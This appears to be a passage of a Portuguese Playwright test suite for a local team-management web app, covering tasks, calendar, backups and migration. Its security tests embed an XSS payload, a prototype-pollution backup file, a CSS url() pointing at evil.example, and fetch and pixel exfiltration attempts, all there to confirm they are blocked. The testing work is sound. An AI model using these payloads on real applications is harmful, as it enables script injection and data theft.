/* Bateria de testes — Gestão da Equipe
 * Uso: npm test   (ou: node tests/run.js [caminho/do/index.html])
 *      TEST_URL=http://localhost:8000/ npm test   → testa servido por HTTP
 * Requer Playwright (Chromium). Cada grupo roda num contexto de navegador limpo.
 * Em todas as páginas, qualquer bloqueio da política de segurança (CSP) é registrado
 * e verificado ao fim de cada grupo: o uso normal não pode gerar nenhum bloqueio. */
const { chromium } = require('playwright');
const path = require('path'); const fs = require('fs'); const os = require('os');
const FILE = path.resolve(process.argv[2] || path.join(__dirname, '..', 'index.html'));
const ROOT = path.dirname(FILE);
/** Todos os arquivos-fonte do sistema (HTML, CSS e JS). */
function sourceFiles(){
  const out = [FILE];
  (function walk(dir){
    for(const f of fs.readdirSync(dir, { withFileTypes: true })){
      const p = path.join(dir, f.name);
      if(f.isDirectory()) walk(p);
      else if(/\.(js|css)$/.test(f.name)) out.push(p);
    }
  })(path.join(ROOT, 'js'));
  (function walk(dir){ for(const f of fs.readdirSync(dir)) out.push(path.join(dir, f)); })(path.join(ROOT, 'css'));
  return out;
}
// Por padrão abre o arquivo direto do disco; TEST_URL permite testar servido por HTTP (como no GitHub Pages).
const URL = process.env.TEST_URL || 'file://' + FILE;
const results = []; let current = '';
function check(name, ok, detail){ results.push({ group: current, name, ok: !!ok, detail: ok ? '' : (detail === undefined ? '' : String(detail)) }); }
const V = '#mainArea .view:not([hidden]) ';
const XSS = `"><img src=x onerror="window.__xss=(window.__xss||0)+1"><script>window.__xss=(window.__xss||0)+1</script>'`;

async function newPage(browser, opts = {}){
  const ctx = await browser.newContext({ viewport: { width: 1300, height: 850 }, acceptDownloads: true });
  const page = await ctx.newPage();
  page.__errors = [];
  page.on('pageerror', e => page.__errors.push(e.message));
  await page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.violatedDirective + ' ' + (e.blockedURI || e.sample || '')));
  });
  page.on('dialog', d => { (page.__dialogs = page.__dialogs || []).push(d.message()); opts.dismiss ? d.dismiss() : d.accept(); });
  await page.route(/fonts\.(googleapis|gstatic)\.com/, r => r.abort());
  await page.goto(URL);
  if(opts.seed) await page.evaluate(opts.seed.fn, opts.seed.arg);
  await page.reload();
  return page;
}
async function cspClean(page){
  const v = await page.evaluate(() => window.__csp || []);
  check('uso normal sem nenhum bloqueio da política de segurança', v.length === 0, JSON.stringify(v));
}
async function createSection(page, name){
  if(await page.$eval('#emptyState', e => !e.hidden)){
    await page.fill('#firstSectionInput', name); await page.click('#firstSectionForm button');
  }else{
    await page.click('#editSectionsBtn'); await page.fill('#newSectionInput', name); await page.click('#sectionAddForm button'); await page.click('#sectionsDoneBtn');
  }
}
const goModule = (page, mod) => page.click(`#sectionNav .submodule-list:not([hidden]) .submodule-item[data-module=${mod}]`);
async function newTask(page, fields){
  await page.click(V + '.add-task-btn');
  if(fields.title !== undefined) await page.fill('#taskTitleInput', fields.title);
  for(const [id, val] of Object.entries(fields.inputs || {})) await page.fill('#' + id, val);
  if(fields.priority) await page.selectOption('#taskPriority', fields.priority);
  await page.keyboard.press('Escape');
}
async function xssCount(page){
  return page.evaluate(() => ({ ran: window.__xss || 0, imgs: document.querySelectorAll('img[src="x"]').length, scripts: [...document.querySelectorAll('script')].filter(s => s.textContent.includes('__xss')).length }));
}

(async () => {
  const browser = await chromium.launch();
  const t0 = Date.now();

  /* ======================= FUNCIONAIS ======================= */
  current = 'Abertura e aparência';
  try {
    const p = await newPage(browser, { seed: { fn: () => localStorage.clear() } });
    check('abre direto, sem tela de login', !(await p.$('#loginForm')) && await p.isVisible('#mainArea'));
    check('primeiro uso começa sem seções', await p.$eval('#emptyState', e => !e.hidden) && (await p.$$('#sectionNav .module-item')).length === 0);
    check('sem usuário no canto superior direito', !(await p.$('#accountBtn')) && !(await p.$('.topbar')));
    check('modo escuro fica na barra lateral', await p.isVisible('.sidebar #darkModeBtn'));
    const bg = await p.$eval('.sidebar', e => getComputedStyle(e).backgroundColor);
    check('barra lateral em azul', bg === 'rgb(15, 43, 76)', bg);
    check('nenhum dado de conta é criado', await p.evaluate(() => !localStorage.getItem('equipe-users-v1') && !localStorage.getItem('equipe-session-v1')));
    check('sem erros de script', p.__errors.length === 0, p.__errors.join(' | '));
    await p.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  current = 'Seções';
  try {
    const p = await newPage(browser, { seed: { fn: () => localStorage.clear() } });
    
    await p.click('#firstSectionForm button');
    check('primeira seção exige nome', /Informe/.test(await p.$eval('#firstSectionError', e => e.textContent)));
    await createSection(p, 'Administração');
    check('cria a primeira seção com Tarefas e Calendário', JSON.stringify(await p.$$eval('#sectionNav .submodule-list:not([hidden]) .submodule-item', e => e.map(x => x.textContent))) === '["Tarefas","Calendário"]');
    await createSection(p, 'Logística'); await createSection(p, 'GED');
    const nav = () => p.$$eval('#sectionNav .module-item', e => e.map(x => x.textContent.trim()));
    check('cria várias seções', (await nav()).join(',') === 'Administração,Logística,GED');
    await p.click('#editSectionsBtn');
    await p.fill('#newSectionInput', ' ged '); await p.click('#sectionAddForm button');
    check('recusa nome de seção duplicado (sem diferenciar maiúsculas)', /Já existe/.test(await p.$eval('#sectionEditorError', e => e.textContent)));
    await p.fill('#sectionEditorList .section-editor-row:nth-child(2) .section-editor-name', 'Suprimentos');
    await p.press('#sectionEditorList .section-editor-row:nth-child(2) .section-editor-name', 'Enter');
    await p.click('#sectionEditorList .section-editor-row:nth-child(3) .js-up');
    check('renomeia e reordena', (await nav()).join(',') === 'Administração,GED,Suprimentos');
    await p.click('#sectionEditorList .section-editor-row:nth-child(2) .js-delete');
    check('exclui seção', (await nav()).join(',') === 'Administração,Suprimentos');
    await p.click('#sectionsDoneBtn');
    await p.reload();
    check('seções persistem após recarregar', (await nav()).join(',') === 'Administração,Suprimentos');
    await cspClean(p);
    check('sem erros de script', p.__errors.length === 0, p.__errors.join(' | '));
    await p.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  current = 'Tarefas e grupos';
  try {
    const p = await newPage(browser, { seed: { fn: () => localStorage.clear() } });
    await createSection(p, 'Operações'); await createSection(p, 'Outra');
    await p.click('#sectionNav .module-item:has-text("Operações")');
    check('quadro novo tem 3 colunas', (await p.$$(V + '.column')).length === 3);
    check('quadro novo não tem grupos (só "Todos")', JSON.stringify(await p.$$eval(V + '.js-group-filter .chip', c => c.map(x => x.textContent))) === '["Todos"]');
    await newTask(p, { title: 'Comprar material', inputs: { taskResponsavel: 'Bruno Lima', taskPrazo: '2026-12-05', taskReferencia: 'OF-12', taskDescricao: 'Aguardando cotação' }, priority: 'alta' });
    const card = await p.$eval(V + '.task-card', c => c.innerText);
    check('cartão mostra título, prioridade, responsável e prazo', /Comprar material/.test(card) && /Prioridade alta/.test(card) && /Bruno Lima/.test(card) && /05\/12/.test(card) && /OF-12/.test(card), card);
    // grupo via "Cadastrar novo"
    await p.click(V + '.task-card'); await p.click('#taskGroup');
    const menu = await p.$$eval('#taskGroupMenu .group-option', o => o.map(x => x.innerText.trim()));
    check('lista de grupos começa com "Cadastrar novo grupo"', /Cadastrar novo/.test(menu[0]) && /Sem grupo/.test(menu[1]), menu);
    await p.click('#taskGroupMenu .group-option.create');
    check('"Cadastrar novo" abre a janela de grupos da seção', await p.$eval('#groupsModalHint', e => e.textContent) === 'Especifique os grupos da seção de Operações');
    await p.fill('#newGroupInput', 'Compras'); await p.press('#newGroupInput', 'Enter');
    await p.click('#groupEditorList .group-color-btn'); await p.click('#colorGrid .color-swatch[data-color="rose"]');
    await p.click('#groupsDoneBtn');
    check('grupo criado fica selecionado na tarefa', /Compras/.test(await p.$eval('#taskGroup', e => e.innerText)));
    // checklist
    await p.click('#addChecklistBtn'); await p.keyboard.type('Pedir 3 cotações'); await p.keyboard.press('Enter'); await p.keyboard.type('Aprovar');
    await p.click('#taskChecklist .checklist-item:nth-child(1) input[type=checkbox]');
    await p.keyboard.press('Escape');
    check('checklist conta itens concluídos', /1\/2/.test(await p.$eval(V + '.task-card', c => c.innerText)));
    const badge = await p.$eval(V + '.task-card .badge-group', b => ({ g: b.style.getPropertyValue('--g'), color: getComputedStyle(b).color }));
    check('cor escolhida para o grupo é aplicada no selo', badge.g === '#A14A6B' && badge.color === 'rgb(161, 74, 107)', JSON.stringify(badge));
    check('grupo aparece no cartão e no filtro', await p.$eval(V + '.task-card .badge-group', b => b.textContent) === 'Compras' && (await p.$$(V + '.js-group-filter .chip')).length === 2);
    // filtros e busca
    await newTask(p, { title: 'Sem grupo aqui' });
    await p.click(V + '.js-group-filter .chip:has-text("Compras")');
    check('filtro por grupo', (await p.$$(V + '.task-card')).length === 1);
    await p.click(V + '.js-group-filter .chip:has-text("Sem grupo")');
    check('filtro "Sem grupo"', await p.$eval(V + '.task-card .task-title', e => e.textContent) === 'Sem grupo aqui');
    await p.click(V + '.js-group-filter .chip:has-text("Todos")');
    await p.fill(V + '.js-search', 'bruno');
    check('busca por responsável', (await p.$$(V + '.task-card')).length === 1);
    await p.fill(V + '.js-search', '');
    // mover entre colunas (arrastar)
    await p.dragAndDrop(V + '.task-card:has-text("Comprar material")', V + '.column:nth-child(3) .column-body');
    check('arrastar move a tarefa de coluna', /Comprar material/.test(await p.$eval(V + '.column:nth-child(3)', c => c.innerText)));
    // colunas
    await p.click(V + '.add-column-btn'); await p.keyboard.type('Arquivo'); await p.keyboard.press('Enter');
    check('cria e nomeia coluna', (await p.$$eval(V + '.column-title', t => t.map(x => x.textContent))).includes('Arquivo'));
    await p.click(V + '.column:has-text("Arquivo") .column-menu-btn');
    check('exclui coluna', !(await p.$$eval(V + '.column-title', t => t.map(x => x.textContent))).includes('Arquivo'));
    // grupos: renomear, duplicado, excluir
    await p.click(V + '.js-manage-groups');
    await p.fill('#newGroupInput', 'Viagens'); await p.click('#groupAddForm button');
    await p.fill('#groupEditorList .section-editor-row:nth-child(2) input', 'compras'); await p.press('#groupEditorList .section-editor-row:nth-child(2) input', 'Enter');
    check('recusa nome de grupo duplicado', /Já existe/.test(await p.$eval('#groupEditorError', e => e.textContent)));
    await p.click('#groupEditorList .section-editor-row:nth-child(1) .icon-btn.danger');
    await p.click('#groupsDoneBtn');
    check('excluir grupo mantém a tarefa, sem grupo', (await p.$$(V + '.task-card')).length === 2 && (await p.$$(V + '.task-card .badge-group')).length === 0);
    // grupos são por seção
    await p.click('#sectionNav .module-item:has-text("Outra")');
    check('grupos e tarefas são separados por seção', (await p.$$(V + '.task-card')).length === 0 && (await p.$$(V + '.js-group-filter .chip')).length === 1);
    await p.click('#sectionNav .module-item:has-text("Operações")');
    // excluir tarefa
    await p.click(V + '.task-card:has-text("Sem grupo aqui")'); await p.click('#deleteTaskBtn');
    check('exclui tarefa', (await p.$$(V + '.task-card')).length === 1);
    // relatório
    await p.evaluate(() => { window.__printed = 0; window.print = () => { window.__printed++; }; });
    await p.click(V + '.task-card'); await p.click('#generateReportBtn');
    const rep = await p.$eval('#printRoot', e => e.textContent);
    check('relatório sai em retrato (A4)', await p.evaluate(() => [...document.adoptedStyleSheets].some(s => [...s.cssRules].some(r => /size: a4( portrait)?;/i.test(r.cssText)))));
    check('relatório traz "Situação" e os dados da tarefa', /Situação/.test(rep) && /Aguardando cotação/.test(rep) && /Operações/.test(rep) && !/SITREP/.test(rep), rep.slice(0, 200));
    await p.keyboard.press('Escape');
    await p.click(V + '.js-export-pdf');
    check('exportar PDF do quadro aciona a impressão', await p.evaluate(() => window.__printed) === 2);
    await p.reload();
    check('tarefas persistem após recarregar', (await p.$$(V + '.task-card')).length === 1);
    await cspClean(p);
    check('sem erros de script', p.__errors.length === 0, p.__errors.join(' | '));
    await p.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  current = 'Calendário';
  try {
    const p = await newPage(browser, { seed: { fn: () => localStorage.clear() } });
    await p.clock.install({ time: new Date('2026-11-13T09:00:00') });
    await p.reload();
    await createSection(p, 'Logística'); await goModule(p, 'calendar');
    const firstDay = () => p.evaluate(() => { const v = document.querySelector('#mainArea .view:not([hidden])'); const c = v.querySelector('.entity-col-header').getBoundingClientRect().right; const h = [...v.querySelectorAll('.day-header')].find(h => h.getBoundingClientRect().right > c + 1); return h.querySelector('.dom').textContent; });
    check('abre no dia de hoje (13)', await firstDay() === '13');
    await p.click(V + '.js-add-activity');
    check('pede entidade antes de atividade', (p.__dialogs || []).some(m => /entidade/.test(m)));
    await p.click(V + '.js-add-entity'); await p.keyboard.type('Equipe Alfa'); await p.keyboard.press('Enter');
    await p.click(V + '.js-add-entity'); await p.keyboard.type('Equipe Bravo'); await p.keyboard.press('Enter');
    const dot = await p.$eval(V + '.entity-color-dot', d => getComputedStyle(d).backgroundColor);
    check('cor da entidade é aplicada', dot !== 'rgba(0, 0, 0, 0)' && dot !== '', dot);
    check('cria e nomeia entidades', JSON.stringify(await p.$$eval(V + '.entity-name', e => e.map(x => x.textContent))) === '["Equipe Alfa","Equipe Bravo"]');
    await p.click(V + 'tbody tr:nth-child(1) .day-cell.today');
    await p.fill('#activityTitleInput', 'Inspeção');
    await p.click('#activityDayPicker label:has-text("14")'); await p.click('#activityDayPicker label:has-text("15")');
    await p.keyboard.press('Escape');
    check('atividade em vários dias', (await p.$$(V + '.activity-chip')).length === 3);
    await p.click(V + '.activity-chip'); await p.click('#deleteActivityBtn');
    check('exclui atividade', (await p.$$(V + '.activity-chip')).length === 0);
    await p.click(V + 'tbody tr:nth-child(2) .day-cell.today'); await p.keyboard.press('Escape');
    check('atividade sem título é descartada', (await p.$$(V + '.activity-chip')).length === 0);
    await p.click(V + 'tbody tr:nth-child(2) .day-cell.today'); await p.fill('#activityTitleInput', 'Treino'); await p.keyboard.press('Escape');
    await p.click(V + '.js-clear-month');
    check('apagar dados do mês', (await p.$$(V + '.activity-chip')).length === 0);
    await p.fill(V + '.js-new-request', 'Pedido de inclusão'); await p.click(V + '.js-add-request');
    await p.click(V + '.request-row input[type=checkbox]');
    check('solicitação: incluir e marcar atendida', await p.$eval(V + '.request-row', r => r.classList.contains('resolved')));
    await p.click(V + '.request-remove');
    check('solicitação: remover', (await p.$$(V + '.request-row')).length === 0);
    await p.click(V + '.js-next'); check('mês seguinte começa no dia 1', await firstDay() === '1');
    await p.click(V + '.js-today'); check('"Hoje" volta para o dia 13', await firstDay() === '13');
    await p.evaluate(() => { const s = document.querySelector('#mainArea .view:not([hidden]) .calendar-scroll'); s.scrollLeft += 300; });
    const solid = await p.$eval(V + '.entity-name-cell', e => getComputedStyle(e).backgroundColor);
    check('coluna de entidades tem fundo sólido', !/rgba\(0, 0, 0, 0\)|transparent/.test(solid), solid);
    await p.click(V + 'tbody tr:nth-child(1) .entity-remove-btn');
    check('remove entidade', (await p.$$(V + '.entity-name')).length === 1);
    await p.evaluate(() => { window.__printed = 0; window.print = () => { window.__printed++; }; });
    await p.click(V + '.js-export-pdf');
    check('PDF do calendário sai em paisagem (A4)', await p.evaluate(() => [...document.adoptedStyleSheets].some(s => [...s.cssRules].some(r => /size: a4 landscape/i.test(r.cssText)))));
    check('exportar PDF do calendário', await p.evaluate(() => window.__printed) === 1 && /Calendário de atividades/.test(await p.$eval('#printRoot', e => e.textContent)));
    await cspClean(p);
    check('sem erros de script', p.__errors.length === 0, p.__errors.join(' | '));
    await p.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  current = 'Tema e backup';
  try {
    const p = await newPage(browser, { seed: { fn: () => localStorage.clear() } });
    await createSection(p, 'A'); await newTask(p, { title: 'T1' });
    await p.click('#darkModeBtn');
    check('modo escuro aplica', await p.evaluate(() => document.documentElement.dataset.theme) === 'dark' && await p.$eval('#darkModeBtn', b => b.getAttribute('aria-checked')) === 'true');
    await p.reload();
    check('modo escuro continua após recarregar', await p.evaluate(() => document.documentElement.dataset.theme) === 'dark');
    await p.click('#darkModeBtn');
    check('desligar volta ao tema claro', await p.evaluate(() => document.documentElement.dataset.theme) === 'light');
    // exportar → importar
    const [dl] = await Promise.all([p.waitForEvent('download'), p.click('#exportBtn')]);
    const exported = JSON.parse(fs.readFileSync(await dl.path(), 'utf8'));
    check('backup exportado contém as seções', exported.sectionList && exported.sectionList[0].name === 'A');
    await p.click('#editSectionsBtn'); await p.click('#sectionEditorList .js-delete'); await p.click('#sectionsDoneBtn');
    const f = path.join(os.tmpdir(), 'bk-' + Date.now() + '.json'); fs.writeFileSync(f, JSON.stringify(exported));
    await p.setInputFiles('#importInput', f); await p.waitForTimeout(300);
    check('importar backup restaura os dados', (await p.$$(V + '.task-card')).length === 1);
    const f2 = f.replace('.json', '-ruim.json'); fs.writeFileSync(f2, 'isto não é json'); await p.setInputFiles('#importInput', f2); await p.waitForTimeout(300);
    check('arquivo inválido é recusado com aviso', (p.__dialogs || []).some(m => /Não foi possível importar/.test(m)));
    await cspClean(p);
    check('sem erros de script', p.__errors.length === 0, p.__errors.join(' | '));
    await p.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  /* ======================= SEGURANÇA ======================= */
  current = 'Segurança — injeção de código pela interface';
  try {
    const p = await newPage(browser, { seed: { fn: () => localStorage.clear() } });
    
    await createSection(p, XSS.slice(0, 40));
    await newTask(p, { title: XSS, inputs: { taskResponsavel: XSS, taskReferencia: XSS, taskDescricao: XSS } });
    await p.click(V + '.task-card'); await p.click('#addChecklistBtn'); await p.keyboard.type(XSS);
    await p.click('#taskGroup'); await p.click('#taskGroupMenu .group-option.create');
    await p.fill('#newGroupInput', XSS.slice(0, 30)); await p.press('#newGroupInput', 'Enter'); await p.click('#groupsDoneBtn');
    await p.evaluate(() => { window.print = () => {}; });
    await p.click('#generateReportBtn'); await p.keyboard.press('Escape');
    await p.click(V + '.column-title'); await p.keyboard.press('ControlOrMeta+A'); await p.keyboard.type(XSS); await p.keyboard.press('Enter');
    await p.click(V + '.board-title'); await p.keyboard.press('ControlOrMeta+A'); await p.keyboard.type(XSS); await p.keyboard.press('Enter');
    await p.click(V + '.js-export-pdf');
    await goModule(p, 'calendar');
    await p.click(V + '.js-add-entity'); await p.keyboard.type(XSS); await p.keyboard.press('Enter');
    await p.click(V + '.day-cell.today'); await p.fill('#activityTitleInput', XSS); await p.keyboard.press('Escape');
    await p.fill(V + '.js-new-request', XSS); await p.click(V + '.js-add-request');
    await p.click(V + '.js-export-pdf');
    await p.click('#editSectionsBtn'); await p.click('#sectionsDoneBtn');
    await p.reload(); await goModule(p, 'kanban'); await p.click(V + '.task-card'); await p.keyboard.press('Escape'); await goModule(p, 'calendar');
    const x = await xssCount(p);
    check('nenhum código injetado é executado (todos os campos de texto)', x.ran === 0 && x.imgs === 0 && x.scripts === 0, JSON.stringify(x));
    check('texto malicioso aparece como texto comum', (await p.$eval(V + '.entity-name', e => e.textContent)).includes('<img src=x'));
    await cspClean(p);
    check('sem erros de script', p.__errors.length === 0, p.__errors.join(' | '));
    await p.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  current = 'Segurança — colar conteúdo formatado';
  try {
    const p = await newPage(browser, { seed: { fn: () => localStorage.clear() } });
    await createSection(p, 'A');
    await p.click(V + '.column-title'); await p.keyboard.press('ControlOrMeta+A');
    await p.evaluate(() => {
      const dt = new DataTransfer();
      dt.setData('text/html', '<b>negrito</b><img src=x onerror="window.__xss=1">');
      dt.setData('text/plain', 'negrito');
      document.activeElement.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true }));
    });
    const html = await p.$eval(V + '.column-title', e => e.innerHTML);
    check('colar em campo editável insere só texto simples', !/<b>|<img/.test(html) && html.includes('negrito'), html);
    await p.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  current = 'Segurança — backup adulterado';
  try {
    const p = await newPage(browser, { seed: { fn: () => localStorage.clear() } });
    await createSection(p, 'A');
    const evil = {
      version: 3,
      sectionList: [{ id: 'sec1', name: XSS }, { id: '__proto__', name: 'proto' }, { id: 'constructor', name: 'c' }, { id: 'x"y', name: 'aspas' }],
      sections: JSON.parse(`{"__proto__":{"polluted":true,"kanban":{"tasks":{}}},"sec1":{"kanban":{"boardTitle":${JSON.stringify(XSS)},
        "columns":[{"id":"c1","title":${JSON.stringify(XSS)},"taskIds":["t1","__proto__","t2","naoexiste"]},{"id":"c2\\"><img src=x onerror=window.__xss=1>","title":"b","taskIds":"nao-e-lista"}],
        "tasks":{"__proto__":{"polluted":true},"t1":{"id":"t1","title":${JSON.stringify(XSS)},"priority":${JSON.stringify(XSS)},"prazo":${JSON.stringify(XSS)},"responsavel":${JSON.stringify(XSS)},"group":"g1","checklist":"x"},
                 "t2":{"title":123,"priority":"alta","prazo":"2026-01-02","checklist":[{"text":${JSON.stringify(XSS)},"done":"sim"}]}},
        "groups":[{"id":"g1","name":${JSON.stringify(XSS)},"color":"red;background:url(https://evil.example/x)"},{"id":"__proto__","name":"p","color":"x"}]},
        "calendar":{"entities":[{"id":"e1","name":${JSON.stringify(XSS)},"color":"constructor"},{"id":"e2","name":"ok","color":"\\"><img src=x onerror=window.__xss=1>"}],
          "activities":[{"id":"a1","entityId":"e1","title":${JSON.stringify(XSS)},"days":"2026-11-23"},{"id":"a2","entityId":"e1","title":"ok","days":["2026-11-23","<img src=x>"]}],
          "requests":[{"id":"r1","text":${JSON.stringify(XSS)},"resolved":"talvez"},null,"texto"]}}}`)
    };
    const f = path.join(os.tmpdir(), 'evil-' + Date.now() + '.json'); fs.writeFileSync(f, JSON.stringify(evil));
    await p.setInputFiles('#importInput', f); await p.waitForTimeout(400);
    const navOk = await p.$$eval('#sectionNav .module-item', e => e.length);
    check('app continua funcionando após importar backup adulterado', navOk >= 1 && p.__errors.length === 0, p.__errors.join(' | '));
    check('sem poluição de protótipo', await p.evaluate(() => ({}).polluted === undefined && ({}).kanban === undefined && Object.hasOwn(Object.prototype, 'polluted') === false));
    await p.evaluate(() => { window.print = () => {}; });
    if((await p.$$(V + '.task-card')).length){ await p.click(V + '.task-card'); await p.click('#generateReportBtn'); await p.keyboard.press('Escape'); }
    await p.click(V + '.js-export-pdf').catch(() => {});
    await goModule(p, 'calendar').catch(() => {});
    await p.click(V + '.js-export-pdf').catch(() => {});
    const x = await xssCount(p);
    check('nenhum código do backup é executado', x.ran === 0 && x.imgs === 0, JSON.stringify(x));
    check('nenhuma cor/estilo do backup aponta para endereço externo', await p.evaluate(() => !document.documentElement.innerHTML.includes('evil.example')));
    await p.reload();
    check('dados saneados persistem sem erros', p.__errors.length === 0, p.__errors.join(' | '));
    await p.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  current = 'Segurança — código-fonte';
  try {
    const src = sourceFiles().map(f => fs.readFileSync(f, 'utf8')).join('\n');
    check('código-fonte não contém hashes de senha embutidos', !/\b[0-9a-f]{64}\b/i.test(src), (src.match(/\b[0-9a-f]{64}\b/i) || [''])[0]);
    check('código-fonte não tem tela nem rotina de login', !/id="loginForm"|PBKDF2|sha256Hex/.test(src));
    const html = fs.readFileSync(FILE, 'utf8');
    check('HTML sem código JavaScript embutido (só arquivos em js/)', !/<script(?![^>]*\bsrc=)[^>]*>/i.test(html) && !/\son[a-z]+\s*=/i.test(html));
    check('HTML sem estilos embutidos (só arquivos em css/)', !/<style[\s>]/i.test(html) && !/\sstyle\s*=/i.test(html));
    const csp = (html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/) || [])[1] || '';
    check("política de segurança sem exceções 'unsafe-inline'", csp && !/unsafe-inline|unsafe-eval/.test(csp), csp);
    const js = sourceFiles().filter(f => f.endsWith('.js')).map(f => fs.readFileSync(f, 'utf8')).join('\n');
    const htmlWrites = [...js.matchAll(/(?:innerHTML|outerHTML)\s*\+?=\s*([^;]+);|insertAdjacentHTML\s*\(/g)].map(m => m[0]);
    const bad = htmlWrites.filter(w => !/^innerHTML\s*=\s*""\s*;$/.test(w));
    check('JavaScript não monta HTML como texto (innerHTML só para esvaziar)', bad.length === 0, bad.join(' | '));
    check('JavaScript não usa eval nem new Function', !/\beval\s*\(|new Function\s*\(/.test(js));
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); }

  current = 'Segurança — política de conteúdo (CSP)';
  try {
    const p = await newPage(browser, { seed: { fn: () => localStorage.clear() } });
    const csp = await p.$eval('meta[http-equiv="Content-Security-Policy"]', m => m.content).catch(() => '');
    check('página declara uma política de segurança de conteúdo', !!csp, 'ausente');
    await p.evaluate(() => { window.__csp = []; document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.violatedDirective)); });
    const exfil = await p.evaluate(async () => { try{ await fetch('https://example.com/?d=1'); return 'enviado'; }catch{ return 'bloqueado'; } });
    check('script não consegue enviar dados para outro site (fetch)', exfil === 'bloqueado', exfil);
    const beacon = await p.evaluate(() => new Promise(res => { const i = new Image(); i.onload = () => res('carregou'); i.onerror = () => res('bloqueado'); i.src = 'https://example.com/pixel.png?d=1'; setTimeout(() => res('bloqueado'), 3000); }));
    check('imagem externa (vazamento por "pixel") é bloqueada', beacon === 'bloqueado', beacon);
    const v = await p.evaluate(() => window.__csp);
    check('os dois bloqueios vêm da política (connect-src e img-src)', v.some(d => /connect-src/.test(d)) && v.some(d => /img-src/.test(d)), JSON.stringify(v));
    await p.context().close();
  } catch(e){ check('grupo concluído sem travar', false, e.message.split('\n')[0]); for(const c of browser.contexts()) await c.close().catch(()=>{}); }

  current = 'Migração da versão com contas';
  try {
    const mk = (title, extraSections) => ({ version: 3, sectionList: [{ id: 's1', name: 'Seção ' + title }].concat(extraSections || []), sections: Object.assign({ s1: { kanban: { boardTitle: 'Q', columns: [{ id: 'c1', title: 'A Fazer', taskIds: ['t1'] }], tasks: { t1: { id: 't1', title: title, group: 'adestramento', priority: 'alta', responsavel: '', prazo: '', referencia: '', descricao: '', checklist: [] } } }, calendar: { entities: [], activities: [], requests: [] } } }, ...(extraSections || []).map(d => ({ [d.id]: {} }))) });
    const users = [{ username: 'usuario.a', algo: 'pbkdf2', salt: 'aa', hash: 'bb', iterations: 150000, theme: 'dark', photo: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAFklEQVR42mP8z8Dwn4EIwDiqkL4KAQB4fwH/Q8b8IQAAAABJRU5ErkJggg==' }, { username: 'usuario.b', algo: 'pbkdf2', salt: 'cc', hash: 'dd', iterations: 150000 }];
    // 1) conta usada por último (sessão) é a escolhida
    const seed1 = { fn: a => { localStorage.clear(); localStorage.setItem('equipe-users-v1', JSON.stringify(a.users)); localStorage.setItem('equipe-session-v1', 'usuario.a');
      localStorage.setItem('equipe-app-v2:usuario.a', JSON.stringify(a.ant)); localStorage.setItem('equipe-app-v2:usuario.b', JSON.stringify(a.mar)); }, arg: { users, ant: mk('Tarefa do usuário A'), mar: mk('Tarefa do usuário B', [{ id: 's2', name: 'Extra' }, { id: 's3', name: 'Extra2' }]) } };
    const p = await newPage(browser, { seed: seed1 });
    const text = await p.evaluate(() => document.body.innerText);
    check('abre direto com os dados da conta usada por último', /Tarefa do usuário A/.test(text) && !/Tarefa do usuário B/.test(text));
    check('grupos antigos continuam (Adestramento)', await p.$eval(V + '.task-card .badge-group', b => b.textContent) === 'Adestramento');
    check('modo escuro da conta é mantido', await p.evaluate(() => document.documentElement.dataset.theme) === 'dark');
    check('foto antiga não é mais guardada', await p.evaluate(() => !JSON.stringify(localStorage).includes('data:image')));
    const ls = await p.evaluate(() => Object.keys(localStorage).sort());
    check('lista de contas (com hashes) e sessão são apagadas', !ls.includes('equipe-users-v1') && !ls.includes('equipe-session-v1') && !(await p.evaluate(() => JSON.stringify(localStorage))).includes('"hash"'), ls.join(','));
    check('cópias antigas dos dados de cada conta são preservadas', ls.includes('equipe-app-v2:usuario.a') && ls.includes('equipe-app-v2:usuario.b'));
    await createSection(p, 'Nova depois da migração'); await p.reload();
    check('após migrar, alterações persistem (não migra de novo)', /Nova depois da migração/.test(await p.evaluate(() => document.body.innerText)));
    check('sem erros de script', p.__errors.length === 0, p.__errors.join(' | '));
    await p.context().close();
    // 2) sem sessão: conta com mais conteúdo
    const seed2 = { fn: a => { localStorage.clear(); localStorage.setItem('equipe-users-v1', JSON.stringify(a.users));
      localStorage.setItem('equipe-app-v2:usuario.a', JSON.stringify(a.ant)); localStorage.setItem('equipe-app-v2:usuario.b', JSON.stringify(a.mar)); }, arg: seed1.arg };
    const p2 = await newPage(browser, { seed: seed2 });
    check('sem sessão: usa a conta com mais conteúdo', /Tarefa do usuário B/.test(await p2.evaluate(() => document.body.innerText)));
    await p2.context().close();
    // 3) versão sem contas
    const p3 = await newPage(browser, { seed: { fn: d => { localStorage.clear(); localStorage.setItem('equipe-app-v2', JSON.stringify(d)); localStorage.setItem('equipe-auth-v1', '1'); }, arg: mk('Da versão sem contas') } });
    check('dados da versão sem contas são aproveitados', /Da versão sem contas/.test(await p3.evaluate(() => document.body.innerText)));
    check('chave de sessão antiga é removida', await p3.evaluate(() => localStorage.getItem('equipe-auth-v1') === null));
    await p3.context().close();
    // 4) formato mais antigo (seção única)
